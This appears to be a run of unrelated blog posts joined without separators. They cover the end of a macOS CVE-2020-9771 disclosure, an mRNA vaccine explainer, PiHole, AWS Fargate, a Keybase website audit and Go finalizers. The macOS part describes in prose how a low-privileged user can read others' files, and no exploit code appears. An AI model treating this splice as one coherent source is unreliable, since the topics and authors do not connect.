<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

<div id="post-body-5079721101533796934">
<p dir="ltr">Now that we understand the basics of innate and adaptive immunity, we can begin to understand how vaccines work. At a high level, the goal of a vaccine is to prime the adaptive immune system so that it is prepared to fight a particular virus without having to survive a real infection by the virus first. Conventional vaccines take several forms, including:</p><ul><li dir="ltr"><p dir="ltr" role="presentation">Inactivated (“killed”) vaccines can be produced by denaturing viruses in a lab (eg, the Salk polio vaccine or certain flu vaccines)</p></li><li dir="ltr"><p dir="ltr" role="presentation">Attenuated vaccines use weakened but live forms of viruses, either produced in a lab by modifying the virus or derived from a related-but-not-pathogenic strain of virus (eg,&nbsp; the Sabin polio vaccine or the cowpox-based vaccine for smallpox)</p></li></ul><p dir="ltr">These types of vaccines have played an important role in protecting humans from viral disease, but not all viruses can be inactivated or attenuated effectively. Modern vaccinology has therefore started looking to new means of creating vaccines like subunit vaccines, in which viral proteins can be used to stimulate an appropriate immune response without ever introducing the whole virus into the host. &nbsp;</p><p dir="ltr">One novel vaccination strategy has gained a lot of attention in the age of COVID-19: mRNA vaccines. mRNA vaccines for SARS-CoV-2 are being developed by <a href="http://modernatx.com/" target="_blank">Moderna Therapeutics</a>, among others, and they are now progressing through clinical trials. Without commenting on Moderna’s specific implementation of an mRNA vaccine, let’s learn more about how mRNA vaccines work in general.</p><p dir="ltr">You may <a href="https://www.hellovirology.com/2020/05/the-viral-genome.html" target="_blank">recall that eukaryotic cells have DNA in their nucleus</a>, and that DNA gets transcribed into RNA, which in turn gets translated into proteins. This is the process that viruses hijack to replicate themselves; an RNA virus gets translated by the same cellular machinery that translates standard cellular RNA.&nbsp;</p><br><table><tbody><tr><td><img height="389" src="https://lh4.googleusercontent.com/xI7NmORnNr7_CyWdb3xibxdBcJuiE9qGwPxMFmCNiISIOyxQLMPkGOVoyjQ7e3Ouu9dgiUpIkqr9b1m0MdYV13dafppGhV2wahPpwNH0CFr_tVI-poVC8-DTSx9u2Or9IFU8Cj63" width="318"></td></tr><tr><td>Recap: the "central dogma" of biology says that DNA makes RNA makes proteins.<br></td></tr></tbody></table><p dir="ltr">RNA vaccines leverage the same principle: if we can get RNA into host cells, we can leverage the cellular machinery to make whatever proteins we want. Now, what should we make if we want to make vaccines? You might think that we should try to make host proteins that fight viruses, but the host immune response is so complex that such an approach would be less effective than administering immune signaling proteins directly. Thinking back to how conventional viruses work, you might instead think that we should make a form of the virus, so that the host can “see” it without needing to be actually infected. This might work, but it would of course be very risky to intentionally infect people with whole viral RNA sequences, as these could easily form whole viruses in the host. But-- what if we instead encoded just the viral fragments that get recognized by <a href="https://www.hellovirology.com/2020/06/innate-immune-cells.html" target="_blank">MHC complexes</a> and the adaptive immune system? Then we could cause an immune response, along with the <a href="https://www.hellovirology.com/2020/06/adaptive-immune-cells.html" target="_blank">immunity-providing expansion of T cells and B cells</a> that respond to the viral proteins we’ve encoded, with little chance that the small viral segments we’ve encoded could replicate or cause damage. Et voila-- an mRNA vaccine with lots of potential and minimal infection risk.</p><p dir="ltr">(An aside: what is the “m” in mRNA for? It stands for “messenger RNA.” When RNA is transcribed from the genome, it often has extra sections that aren’t necessary for making proteins. These sections are cleaved out, and only the protein-coding portions of the RNA are then released from the nucleus for translation. These shortened and modified RNAs that are ready for translation are called mRNA. To call a vaccine an mRNA vaccine, then, means that it has pre-prepped the sections of RNA that we want to turn into proteins, rather than strictly including all RNA that would be transcribed from the genomic DNA.)</p><h3>Challenges and innovations</h3><p dir="ltr">This seems like a brilliant strategy, but why don’t we already have mRNA vaccines for all viruses? It turns out that actually developing an mRNA vaccine has a number of different challenges. Just to name a few:</p><ol><li dir="ltr"><p dir="ltr" role="presentation">Not any mRNA sequence will do. The sequence used must encode protein subunits that are pathogenic enough to stimulate an immune response. Many protein subunits from a given virus are not themselves pathogenic, and many more are pathogenic only for certain individuals with certain genetic backgrounds.</p></li><li dir="ltr"><p dir="ltr" role="presentation">Naked RNA molecules can get tangled up and become double-stranded, which makes them untranslatable by cells and can also stimulate innate immune responses that complicate the effect of the vaccine.</p></li><li dir="ltr"><p dir="ltr" role="presentation">RNA usually starts in the nucleus and moves into the cytoplasm of a cell. In the case of an RNA vaccines, we need a way to take RNA from the lab and get it not just into humans, but into cell cytoplasms. This is made especially difficult by the fact that RNA outside of cells is quickly degraded, so the RNA has to be packaged in such a way that preserves the payload and gets it into cells.</p></li></ol><p dir="ltr">Many technological innovations in recent years have therefore been crucial in moving RNA vaccines from a great but impractical theory to the fastest moving vaccine candidate for SARS-CoV-2. Considering just the three challenges mentioned above:</p><ol><li dir="ltr"><p dir="ltr" role="presentation">The ability to quickly sequence viruses and to use both bioinformatic and laboratory methods to analyze the viral genome, identify protein subunits, and test immune responses to those subunits is critical to correctly designing the mRNA sequences that will be used in vaccines.</p></li><li dir="ltr"><p dir="ltr" role="presentation">mRNA vaccine candidates can take advantage of many innovations developed in the last few decades that increase RNA stability and increase translation efficiency in cells. For example: scientists can replace individual nucleotides in the target sequence to create versions of the sequence that still encode the same exact protein subunit but are easier for the cell to translate; RNA produced in cell culture can be purified to remove double-stranded sequences that might cause an unintentional immune response; and the length and nature of the starts and ends of the RNA can be modified to increase its stability.</p></li><li dir="ltr"><p dir="ltr" role="presentation">In order to deliver RNA sequences to the cytoplasm of cells, scientists have devised a number of delivery methods. One approach requires cells from the host; dendritic cells, which are innate immune cells that are especially good at presenting pathogen fragments to adaptive immune cells in the body, are extracted and loaded with target RNA in cell culture, and then infused back into the host. Another popular delivery method, and the one used by Moderna, is to encase the RNA sequences using lipids and polymers. As with live viruses, lipid packaging allows the RNA to pass cellular lipid membranes and enter the cytoplasm, though the actual mechanism by which the lipid particles dump the RNA sequences into cells is incompletely understood.</p></li></ol><br><table><tbody><tr><td><img height="438" src="https://lh3.googleusercontent.com/MadKfHHtWfuKt-cM2obFWHTLEtkvCZDWLkRMaiRsSRGs6oLrBPKp_OIzbk9QVs00NIhSU1CBeVsSSpyRUd-VZtHASY_yS8-P_gXpY4bMHLtMu_h59zYoCEnFlYQpRib1tCm55TXV=w386-h438" width="386"></td></tr><tr><td>RNA vaccines can be delivered in lipid particles that help the RNA gain cell entry.<br></td></tr></tbody></table><p dir="ltr">So to recap, RNA-based approaches offer a whole new set of possibilities in vaccine design-- if we can get them to work in practice.

The current rush to make an RNA-based vaccine for SARS-CoV-2 has the potential to really accelerate the field, though we are still in the early days of exploration in this space.</p><h3>Sources</h3><ul><li dir="ltr"><p dir="ltr" role="presentation">Image 1: <a href="https://commons.wikimedia.org/wiki/File:Central_Dogma_of_Molecular_Biochemistry_with_Enzymes.jpg" target="_blank">https://commons.wikimedia.org/wiki/File:Central_Dogma_of_Molecular_Biochemistry_with_Enzymes.jpg</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation">Image 2: <a href="https://commons.wikimedia.org/wiki/File:SNALP_Structure.jpg" target="_blank">https://commons.wikimedia.org/wiki/File:SNALP_Structure.jpg</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://en.wikipedia.org/wiki/Inactivated_vaccine" target="_blank">https://en.wikipedia.org/wiki/Inactivated_vaccine</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://en.wikipedia.org/wiki/Attenuated_vaccine" target="_blank">https://en.wikipedia.org/wiki/Attenuated_vaccine</a></p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://www.nature.com/articles/nrd.2017.243" target="_blank">mRNA vaccines — a new era in vaccinology</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://www.sciencedirect.com/science/article/pii/S2352396419304384" target="_blank">Long-term efficacy and safety of mRNA therapy in two murine models of methylmalonic acidemia</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://immunology.sciencemag.org/content/4/35/eaaw6647" target="_blank">A lipid-encapsulated mRNA encoding a potently neutralizing human monoclonal antibody protects against chikungunya infection</a>&nbsp;</p></li></ul>

<br/>
July 3, 2020 | https://yarmo.eu/post/pihole | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/pihole">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><code>#100DaysToOffload &gt;&gt; 2020-05-10 &gt;&gt; 016/100</code></p>
<p><a href="https://pi-hole.net/">PiHole</a> is almost ubiquitously present on every list of services people could/should selfhost. And rightfully so, it is easy to set up and extremely useful on a daily basis. It blocks ads on almost all websites on all the devices in your home without the necessity of installing anything on them. It will also stop some devices from communicating with their parent companies behind your back.</p>
<h2>How it works</h2>
<p>To understand how PiHole does its thing, we need a quick introduction into how DNS works, the system that makes sure we can visit websites even if they are located on the other side of the world. The problem DNS solves is that the URL you use to visit a website doesn't tell your device anything about the physical location or IP address of the server that hosts the website.</p>
<p>If you wish to visit a website, say <a href="https://yarmo.eu/">yarmo.eu</a>, you enter that address in the top bar and hit enter. Your browser will then ask your router to get this website for you. If this is the first time you visit this website, your router doesn't know yet where the server is located, so it asks a DNS server in geographical proximity, usually the DNS server of your ISP.</p>
<p>If this DNS server knows the IP address of the server, it will be relayed back to your device which will now ask that server directly for the content of the website. If the DNS server doesn't have this information, it will ask another and so forth until the IP address of the host server is found.</p>
<p>As we established above, your router contains a DNS router. However, this can almost always be delegated to another DNS server in your home. That's where PiHole comes in. Instead of your router trying to figure out where the website server is located, it will ask PiHole to do so.</p>
<p>But PiHole has a trick up its sleeve: it has a built-in database of hundreds of thousands of URLs that are associated with ads and when they are requested, PiHole simply ignores them.</p>
<p>So you want to visit <code>coolsite.com</code>? Fine, PiHole will get you that website. Now, <code>coolsite.com</code> suddenly wants to load an ad from <code>ads.gafam.com</code>? The computer asks the router, the router asks PiHole, PiHole knows this URL is used to serve ads and will block that request, giving you a website without ads. Awesome!</p>
<h2>Something you want to say?</h2>
<p>Meanwhile, you are listening to music using a wireless speaker in your living room from a made-up brand "NOSON". What you don't know is that this device is continuously sending messages to the company containing information about the music you play and more. PiHole knows this and as soon as the speaker requests to send a message to <code>metrics.noson.com</code>, PiHole says no.</p>
<p>That's how PiHole blocks ads AND protects your privacy.</p>
<h2>Dedicated hardware</h2>
<p>Dedicating hardware to PiHole is advised but the hardware can be as simple as a <a href="https://www.raspberrypi.org/products/raspberry-pi-zero/">Raspberry Pi Zero</a>. The reason it is advised to use dedicated hardware is because if your PiHole crashes, there's no more internet in the home until you get the PiHole working again. It way to prevent this situation from happening is to always have two PiHoles running on separate hardware and telling the router about both PiHoles.</p>
<h2>Second DNS server?</h2>
<p>Oh, and while we're on the subject: do not put any "fallback" DNS servers like Google's or Cloudflare's in the second DNS server field on your router. Unfortunately, it doesn't work like a fallback, all routers will simply divide the workload over the two DNS servers. This means that if an outside DNS server is put in second place, it will receive DNS calls even if the PiHole is fully functional.</p>
<p>Having a proper DNS fallback server is difficult to set up, so best would be to use two different PiHole instances. Unless, of course, you don't mind a small period of internet loss and you are always nearby to fix the situation.</p>
<h2>Caveats</h2>
<p>Unfortunately, ads on video platforms like YouTube will not be blocked. This is because they serve the ads on the same domains as they serve the main content, meaning that they don't have a <code>ads.youtube.com</code> or something similar. Therefore, PiHole cannot block the ads. As there are a few of these edge cases, it is always recommended to use PiHole in conjunction with on-device ad blockers like <a href="https://getublock.com/">uBlock Origin</a>.</p>
<h2>Final words</h2>
<p>Really, there are few reasons to not get PiHole into your home and the benefits vastly outweigh the challenges (IMHO). It is also a great start on a journey of selfhosting more services and realising that one can be independent of major corporations to some degree.</p></div></div>]]>

  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>

<p>On-demand cloud computing brings new ways to ensure scalability and efficiency. Rather than pre-allocating and managing certain server resources or having to go through the usual process of setting up a cloud cluster, apps and microservices can now rely on on-demand serverless computing blocks designed to be efficient and highly optimized.</p>



<p><a rel="noreferrer noopener" href="https://aws.amazon.com/eks/" target="_blank">Amazon Elastic Kubernetes Service (EKS)</a> already makes running Kubernetes on AWS very easy. Support for <a rel="noreferrer noopener" href="https://aws.amazon.com/fargate/" target="_blank">AWS Fargate</a>, which introduces the on-demand serverless computing element to the environment, makes deploying Kubernetes pods even easier and more efficient. AWS Fargate offers a wide range of features that make managing clusters and pods intuitive.</p>



<h2>Utilizing Fargate</h2>



<p>As with many other AWS services, using Fargate to manage Kubernetes clusters is very easy to do. To integrate Fargate and run a cluster on top of it, you only need to add the command <strong><em>–fargate</em></strong> to the end of your <strong><em>eksctl</em></strong> command.</p>



<p>EKS automatically configures the cluster to run on Fargate. It creates a pod execution role so that pod creation and management can be automated in an on-demand environment. It also patches <em>coredns</em> so the cluster can run smoothly on Fargate.</p>



<p>A Fargate profile is automatically created by the command. You can choose to customize the profile later or configure namespaces yourself, but the default profile is suitable for a wide range of applications already, requiring no human input other than a namespace for the cluster.</p>



<p>There are some prerequisites to keep in mind though. For starters, Fargate requires <em>eksctl</em> version 0.20.0 or later. Fargate also comes with some limitations, starting with support for only a handful of regions. For example, Fargate doesn’t support stateful apps, DaemonSets or privileged containers at the moment. Check out <a rel="noreferrer noopener" href="https://docs.aws.amazon.com/eks/latest/userguide/fargate.html#fargate-considerations" target="_blank">this link </a>for Fargate limitations for your consideration.</p>



<p>Support for conventional load balancing is also limited, which is why ALB Ingress Controller is recommended. At the time of this writing, Classic Load Balancers and Network Load Balancers are not supported yet. </p>



<p>However, you can still be very meticulous in how you manage your clusters, including using different clusters to separate trusted and untrusted workloads.</p>



<p>Everything else is straightforward. Once the cluster is created, you can begin specifying pod execution roles for Fargate. You have the ability to use IAM console to create a role and assign it to a Fargate cluster. Or you can also create IAM roles and Fargate profiles via Terraform.&nbsp;</p>



<h2>Profile and Schedules</h2>



<p>Once the cluster is created, you no longer have to use <em>eksctl</em> to run commands. Fargate can also be controlled from the AWS Management Console. To create a Fargate profile, select a cluster and click the Add Fargate Profile to continue.</p>



<p>You can define certain elements of the Fargate profile after assigning a unique name to it. You can, for instance, add tags to the profile. The tags are used exclusively for the profile and will not be propagated to pods within the cluster.</p>



<p>Pod execution role is where you add the role you have created earlier. If you don’t see the role you have created, make sure the role has eks-fargate-pods.amazonaws.com service principal attached to it. Lastly, define a subnet to complete the profile.</p>



<p>There are other customizations and steps that you can take to fine-tune Fargate to your specific needs. At this point, you can choose to update CoreDNS if you want to limit pods to run on Fargate exclusively rather than EC2. This is because by default, CoreDNS is configured to run on Amazon EC2 workers on Amazon EKS clusters.</p>



<p>Apply the modified coredns.json and run the <strong><em>kubectl patch deployment coredns</em></strong> command to commit the changes you have made. Complete the set up by migrating your application to Fargate and setting up the ALB Ingress Controller.</p>



<h2>Additional Features</h2>



<p>You can configure Fargate pods in different ways depending on the specific needs of your application. Fargate offers a wide range of customization options, allowing you to define things such as vCPU and memory resources from the start.</p>



<p>You pay for Fargate based on the requested vCPU and memory resources. There is also a spot pricing option if you want to further lower the cost of running your application in the cloud. More importantly, Fargate can automate the management of long-running computing resources.</p>



<p>Let’s not forget that you can use the Vertical Pod Autoscaler (VPA) and/or Horizontal Pod Autoscaler (HPA). To do this, you need to install metrics server for the VPA or HPA to consume resource metrics (CPU or memory) or make the scaling based on custom or external metrics⁠—depending on what makes more sense from the application point of view. You also need to install the metrics server or Prometheus in order to gain access to the Autoscalers, but everything else works similarly to when your Kubernetes cluster runs on EC2.</p>



<p>Even better, each Fargate pod receives 20GB of ephemeral storage when it is spooled up. The allocated storage gets deleted when the pods are deleted. Storage is encrypted using AES-256 encryption in the latest iteration of AWS Fargate.</p>



<h2>So, Why Fargate?</h2>



<p>Making the decision to migrate to AWS Fargate is easier than you think. If you find yourself underutilizing your cluster resources most of the time, migrating to AWS Fargate is a great way to take cloud efficiency to a whole new level. The main reason for choosing this service though is that it allows you to focus on building your app rather than deploying and maintaining an EKS cluster. However, the limitations exposed above should be taken into consideration before making the decision.</p>



<p>Fargate maintains that simplicity that we know and love from Amazon EKS, all while reducing costs and improving security. As long as you differentiate the clusters used to run apps at different security requirements, protecting your cloud environment becomes easier.</p>



<p>Besides, scaling up (and down) becomes completely hassle-free when your application runs on AWS Fargate. That, at the end of the day, is the biggest advantage of them all.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Disclaimer</h2>
<p>Two days ago, I launched <a href="https://keyoxide.org/">Keyoxide.org</a> which provides a few similar functions as <a href="https://keybase.io/">Keybase.io</a> but in an Open Source package. I've been wanting to write this post for a while but felt it could be perceived as disingenuous if posted before making my own project public. Therefore, I post this now.</p>
<h2>TLDR</h2>
<p>The Keybase.io website uses non-optimized resources resulting in a slow pageload and 5+ year old versions of libraries with known and public security vulnerabilities.</p>
<h2>The Keybase.io website</h2>
<p>I have opinions about the Keybase service, but this post is not about that. This is about the facts behind their website, <a href="https://keybase.io/">Keybase.io</a> and more specifically their <a href="https://keybase.io/encrypt">encrypt</a> page, the one you use to <strong>encrypt private and confidential messages</strong>.</p>
<p>When you load that specific page, make sure to load it in a private session or window to eliminate cached resources. What do you notice?</p>
<p>It is slow. Really slow. I noticed so too and decided to run a <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/">Webpagetest (link to result)</a>. Out of three runs, we analyze only the median run (so not the best one, not the worst one).</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_overview.png" alt="Keybase encrypt Webpagetest overview"><br>
<em>keybase.io/encrypt</em></p>
<h2>The content loaded</h2>
<p>It takes <strong>6.25&nbsp;seconds</strong> to fully load the <strong>2.9&nbsp;megabytes</strong> that are used on this page. That is hefty for a page that is essentially a single form. I mean, look at it:</p>

<em>Why 2.9 megabytes?</em></p>
<p>That's a regular web form. What could possibly be <strong>2.9&nbsp;megabytes</strong>? The javascript?</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1.png" alt="Webpagetest run 1 overview"><br>
<em>How many requests? How many bytes?</em></p>
<p>Most requests are fonts. That makes sense. Earlier, we saw the page only makes <strong>12&nbsp;requests</strong>, so I could imagine a few of those being several fonts files. Fortunately, fonts are only <strong>6.5%</strong> of the bytes loaded, so we'll forgive them.</p>
<p><strong>90&nbsp;percent</strong> of the bytes are due to javascript and images‽ That's <strong>2.6&nbsp;megabytes</strong> for a form! What images?</p>
<h2>Javascript and image(s)</h2>
<p>Let's grab the <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/1/details/#waterfall_view_step1">waterfall</a> and see what is going on:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1_waterfall.png" alt="Webpagetest run 1 waterfall"><br>
<em>Run 1 waterfall</em></p>
<p>At two points in time, the loading of the website stalls. The first stall is <strong>2.6&nbsp;seconds</strong> for the file <code>sitewide-js.js</code>. The second stall is <strong>2.5&nbsp;seconds</strong> for the file <code>footprints_transp.png</code>. Let's go.</p>
<h2>sitewide-js.js</h2>
<p>This file is <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped. Let us look at a random excerpt:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__js_excerpt.png" alt="Javascript excerpt"><br>
<em>Javascript excerpt</em></p>
<p>This is not really optimized for performance: one could choose to minimize the javascript. Allow me to use <code>@node-minify/cli</code>.</p>
<p><code>JS_Parse_Error [SyntaxError]: Unexpected token: name «syms», expected: punc «;»</code></p>
<p>Hmm… Let's remove that one line which simply initializes a variable (only fix I could find). I can no longer guarantee it works but let's assume it does.</p>
<p>Old version: <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped.<br>
New version: <strong>2.5&nbsp;megabytes</strong> raw and <strong>0.7&nbsp;megabytes</strong> gzipped.</p>
<p>First win!</p>
<p>Well, I need to specify one thing: the website loads a gzipped version of the original file at a size of <strong>1.23&nbsp;megabytes</strong>. When I <code>gzip</code> it on my local machine, the original file even becomes <strong>1&nbsp;megabytes</strong>. I don't know what causes this discrepancy, but while we were able to reduce the raw files by 2.2 megabytes, the reduction could only become 0.3 megabytes once gzipped (on my machine™).</p>
<h2>footprints_transp.png</h2>
<p>Have you found the image yet? It's the little image at the bottom of the dog (?) following footprints. Cute :)</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__img.png" alt="Footprints image"><br>
<em>Footprints image</em></p>
<p>Dimensions on page: <strong>330&nbsp;x&nbsp;90 pixels</strong><br>
Dimensions of file: <strong>2836&nbsp;x&nbsp;770 pixels</strong>  </p>
<p>That's only <strong>8.6 times</strong> larger than it needs to be. The bigger crime is the size: <strong>1.4&nbsp;megabytes</strong>. Which is 50% of the website. You guessed it. This could be better.</p>
<p>Using <a href="https://imagecompressor.com/">imagecompressor.com</a>, I can compress this full-sized image down to <strong>398&nbsp;kilobytes</strong> (reduction of <strong>71%</strong>). And I'm even allowing the full 256 colors. And the dimensions are still <strong>8.6&nbsp;times</strong> larger than they need to be.</p>
<p>Optimizing the compression and the image dimensions could yield even better results. I'm not going to bother. The devs didn't either.</p>
<p>Still, second win!</p>
<h2>Anything else we can learn?</h2>
<p>The source code contains this:</p>
<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                              K E Y   B A S E

                            crypto for everyone

                        because no one we know ever
                      seems to have a public key. :-(

     No Google Analytics or other 3rd party hosted script tags on Keybase.

     And this has the added bonus that we'll never be able to serve ad code.

                                    \o/  \o/
                                  keybase team

  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
<p>I like it when devs get creative. The third paragraph is a bit alienating, but that's my opinion.</p>
<p>Anything else? Given that this is all cryptography related, maybe some security related issues?</p>
<h2>Security</h2>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__security.png" alt="Webpagetest security score"><br>
<em>Webpagetest security score</em></p>
<p>I've ran quite a few webpagetests on different website, but a <strong>0</strong> security score is new to me. What does that even mean?</p>
<p>Well, <a href="https://snyk.io/test/website-scanner/?test=200627_0Q_044080ef3ab8a678721658c90d2f4706">it turns out</a> that the entire website is built using the following libraries:</p>
<ul>
<li>jquery v1.11.3 (from <a href="https://blog.jquery.com/2015/04/28/jquery-1-11-3-and-2-1-4-released-ios-fail-safe-edition/">april 2015</a>)</li>
<li>bootstrap v3.3.5 (from <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">june 2015</a>)</li>
<li>moment v2.7.0 (from <a href="https://github.com/moment/moment/releases/tag/2.7.0">june 2014</a>)</li>
</ul>
<p>Besides the obvious aging, these libraries account for a total of six known and public security vulnerabilities, including <a href="https://snyk.io/vuln/SNYK-JS-BOOTSTRAP-72890">cross-site scripting</a>, <a href="https://snyk.io/vuln/SNYK-JS-JQUERY-174006">prototype pollution</a> and <a href="https://snyk.io/vuln/npm:moment:20161019">regular expression denial of service</a>. All six security vulnerabilities have remediations.</p>
<p>Let the <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">bootstrap v3.3.5 announcement</a> be a painful reminder: this is <em>pushing&nbsp;it</em>.</p>
<h2>Wrapping up</h2>
<p>This should give a nice overview of what could go wrong with a non-optimized and aging website. This could happen to any website. But this is Keybase, the company that promises <strong>"secure messaging and file-sharing"</strong>. The same company that got <a href="https://www.crunchbase.com/organization/keybase">$10.8 million in a Serie A funding</a>. The same company that <a href="https://github.com/keybase/client/issues/24105">won't allow us to see their server code</a>.</p>
<p>To paint a full and fair picture, there has been an <a href="https://keybase.io/docs-assets/blog/NCC_Group_Keybase_KB2018_Public_Report_2019-02-27_v1.3.pdf">audit of the Keybase protocol [PDF]</a> which states that:</p>
<blockquote>
<p>[...] there were weaknesses in the Keybase implementation; these were quickly fixed.</p>
</blockquote>
<p>The audit didn't include the website. I'll just end with another quote from the same audit:</p>
<blockquote>
<p>Another common theme was the presence of legacy code. [...]<br>
This does not necessarily imply that legacy code is insecure, but complexity and security are intertwined – every new piece of code may contain a security vulnerability, and more code correlates with more risk.</p>
</blockquote></div></div>]]>

<p><em>2018-04-04, David Crawshaw</em></p>

<p>Like many garbage collected languages, <a href="https://golang.org/">Go</a> lets
you register a
<a href="https://golang.org/pkg/runtime/#SetFinalizer">finalizer</a> on an object.
The finalizer is a function that the language runtime calls when the object
is garbage collected.</p>

<p>Finalizers are deeply unsatisfying. They are almost impossible to use well.</p>

<p>The obvious use of finalizers is to tie resource management to object
lifetime.
This is such an obvious use that you can even find an unfortunate example
of it in the Go standard library. In <a href="https://golang.org/src/os/file_unix.go#L132">package os</a>:</p>

<pre><code>runtime.SetFinalizer(f.file, (*file).close)
</code></pre>

<p>The idea here is an <code>*os.File</code> has a resource from the operating system,
a file descriptor.
At some point those OS resources need to be cleaned up.
Some short-lived small programs can ignore the problem because the OS
will clean up the descriptors when the process exits.
But for long-lived programs, or programs that want to open lots of
descriptors, the program eventually has to call the <code>Close</code> method.</p>

<p>Tracking when precisely a file should be closed is usually
straightforward, but occasionally it involves a great deal of busywork.
So a common instinct we all have is to say "gee, it sure would be nice
if the file descriptor were closed when the <code>File</code> is garbage collected,
let's use a finalizer". This does not work.</p>

<p>Here is an example where the finalizer fails:</p>

<pre><code>package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func fatal(err error) {
	fmt.Fprintf(os.Stderr, "%v\n", err)
	os.Exit(2)
}

func main() {
	dir, err := ioutil.TempDir("", "finalizers-")
	if err != nil {
		fatal(err)
	}
	defer os.RemoveAll(dir)
	fmt.Printf("temp directory: %s\n", dir)
	for i := 0; i &lt; 2000; i++ {
		path := filepath.Join(dir, fmt.Sprintf("tmp-%d", i))
		f, err := os.Create(path)
		if err != nil {
			fatal(err)
		}
		fmt.Fprintf(f, "temp file %d\n", i)

		// f is no longer live, can be GCed
	}
}
</code></pre>

<p>On macOS the result is:</p>

<pre><code>$ go run junk.go 
temp directory: /tmp/finalizers-802262722
open /tmp/finalizers-802262722/tmp-252: too many open files
exit status 2
</code></pre>

<p>Oops.</p>

<h2>Garbage collectors keep their own hours</h2>

<p>The garbage collection contract says nothing about when
collection occurs.
So while there are GC algorithms that free memory the moment it is
no longer used (for example,
<a href="https://en.wikipedia.org/wiki/Reference_counting">reference counting</a>,
it is typical to batch process memory to reduce CPU cycles spent
collecting garbage.</p>

<p>If there is not a lot of demand for new heap space, the Go GC may take
a very long time to free memory, and thus get around to calling the
finalizer.
The cleanup time of objects is open ended.
<strong>It is a bug</strong> to depend on the GC to run before your resources are
exhausted.</p>

<h2>What are finalizers good for?</h2>

<p>Nothing generally.</p>

<p>If you are deeply familiar with the GC algorithm being used in your
runtime, you may be able to use them to manage a resource whose use
is tied closely to heap use.
Maybe C heap.</p>

<p>If you are reasonably sure the algorithm will eventually process all
